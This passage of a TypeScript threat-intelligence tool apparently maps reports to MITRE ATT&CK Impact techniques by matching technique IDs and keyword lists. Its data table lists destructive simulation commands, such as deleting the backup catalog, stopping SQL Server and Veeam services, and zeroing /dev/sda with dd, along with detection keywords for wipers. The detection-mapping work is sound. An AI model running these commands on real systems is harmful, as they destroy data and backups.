          "wbadmin.exe delete catalog -quiet",
        ],
        detectionKeywords: ["vssadmin delete shadows", "inhibit system recovery", "shadow copies", "bcdedit recoveryenabled"],
      },
      {
        id: "T1489",
        name: "Service Stop",
        tacticId: "TA0040",
        tacticName: "Impact",
        description: "Stopping database, backup, or security services to facilitate encryption or cause denial of service.",
        simulationCommands: ["net.exe stop MSSQLSERVER /y", "sc.exe stop veeam"],
        detectionKeywords: ["service stop", "stop mssqlserver", "kill database service", "stop backup service"],
      },
      {
        id: "T1485",
        name: "Data Destruction",
        tacticId: "TA0040",
        tacticName: "Impact",
        description: "Overwriting or zeroing data to render files completely unrecoverable.",
        simulationCommands: ["dd if=/dev/zero of=/dev/sda bs=1M count=100"],
        detectionKeywords: ["wiper", "hermeticwiper", "data destruction", "disk wipe", "caddywiper"],
      },
    ],
  },
];

/**
 * Intelligent Mapping Engine: Matches Knowledge Base Reports to MITRE ATT&CK Matrix
 */
export function mapReportsToMitreMatrix(reports: ReportListItem[]): MappedTactic[] {
  return MITRE_TACTICS_DATA.map((tactic) => {
    let totalTacticMappedReports = 0;

    const mappedTechniques: MappedTechnique[] = tactic.techniques.map((tech) => {
      const matchedReports: ReportListItem[] = [];

      for (const report of reports) {
        let isMatch = false;

        // 1. Direct Technique ID match in extracted entities
        const extTechs = report.extractedEntities?.techniques || [];
        if (extTechs.some((t) => t.id === tech.id || t.id.startsWith(`${tech.id}.`))) {
          isMatch = true;
        }

        // 2. Attack Chain steps match
        const attackSteps = report.analysis?.attackChain || [];
        for (const step of attackSteps) {
          if (step.techniques?.some((t) => t.id === tech.id || t.id.startsWith(`${tech.id}.`))) {
            isMatch = true;
            break;
          }
          // Match by tactic name
          if (step.tactic.toLowerCase() === tactic.name.toLowerCase() && !isMatch) {
            // Check if step techniques or step description relates to this technique
            const stepStr = `${step.tactic} ${step.step} ${step.techniques?.map((t) => t.name).join(" ")}`.toLowerCase();
            if (tech.detectionKeywords.some((kw) => stepStr.includes(kw.toLowerCase()))) {
              isMatch = true;
              break;
            }
          }
        }

        // 3. Execution procedures & commands match
        if (!isMatch && report.extractedEntities?.procedures) {
          const procs = report.extractedEntities.procedures.join(" ").toLowerCase();
          if (tech.detectionKeywords.some((kw) => procs.includes(kw.toLowerCase()))) {
            isMatch = true;
          }
        }

        // 4. Classification & keyword match in title and excerpt
        if (!isMatch) {
          const reportText = `${report.title} ${report.excerpt} ${report.classification}`.toLowerCase();
          // Require technique ID or specific keyword phrase match
          if (reportText.includes(tech.id.toLowerCase())) {
            isMatch = true;
          } else {
            const matchesKeyword = tech.detectionKeywords.some((kw) => reportText.includes(kw.toLowerCase()));
            if (matchesKeyword) {
              // Extra check: ensure tactic relevance
              const matchesTactic =
                reportText.includes(tactic.name.toLowerCase()) ||
                reportText.includes(tactic.shortName.toLowerCase()) ||
                (report.resourceKind === "FULL_ATTACK_CHAIN" && ["Execution", "Persistence", "Initial Access", "Command and Control", "Impact"].includes(tactic.name));
              if (matchesTactic) {
                isMatch = true;
              }
            }
          }
        }

        if (isMatch) {
          matchedReports.push(report);
        }
      }

      totalTacticMappedReports += matchedReports.length;

      const avgSimScore =
        matchedReports.length > 0
          ? Math.round(
              (matchedReports.reduce((acc, r) => acc + (r.simulationScore || r.qualityScore || 0.5), 0) /
                matchedReports.length) *
                100,
            ) / 100
          : 0;

      const hasNovelTtp = matchedReports.some((r) => r.isEmergingTechnique);

      return {
        ...tech,
        mappedReports: matchedReports,
        coverageCount: matchedReports.length,
        avgSimulationScore: avgSimScore,
        hasNovelTtp,
        hasSimulationCommands: tech.simulationCommands.length > 0,
      };
    });

    const coveredTechniques = mappedTechniques.filter((t) => t.coverageCount > 0).length;
    const coveragePercentage = Math.round((coveredTechniques / mappedTechniques.length) * 100);

    return {
      id: tactic.id,
      name: tactic.name,
      shortName: tactic.shortName,
      description: tactic.description,
      order: tactic.order,
      techniques: mappedTechniques,
      totalTechniques: mappedTechniques.length,
      coveredTechniques,
      coveragePercentage,
      totalMappedReports: totalTacticMappedReports,
    };
  });
}
